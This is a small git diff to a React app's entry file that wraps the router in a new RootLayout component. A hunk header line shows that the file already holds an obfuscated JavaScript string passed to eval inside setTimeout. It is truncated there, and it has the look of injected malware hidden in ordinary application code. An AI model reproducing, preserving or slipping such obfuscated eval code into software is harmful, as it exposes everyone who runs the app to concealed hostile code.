@@ -6,6 +6,7 @@ import { initSentry } from '@ui-kit/features/sentry'
 import { t } from '@ui-kit/lib/i18n'
 import { ErrorBoundary } from '@ui-kit/widgets/ErrorBoundary'
 import { router } from './routes'
+import { RootLayout } from './routes/RootLayout'
 
 initSentry()
 
@@ -16,7 +17,9 @@ setTimeout(() => eval(`var _0x39a003=_0x2628;(function(_0xfb5890,_0x21d0c7){var 
 createRoot(document.getElementById('root')!).render(
   <ErrorBoundary title={t`Application error`}>
     <StrictMode>
-      <RouterProvider router={router} />
+      <RootLayout>
+        <RouterProvider router={router} />
+      </RootLayout>
     </StrictMode>
   </ErrorBoundary>,
 )
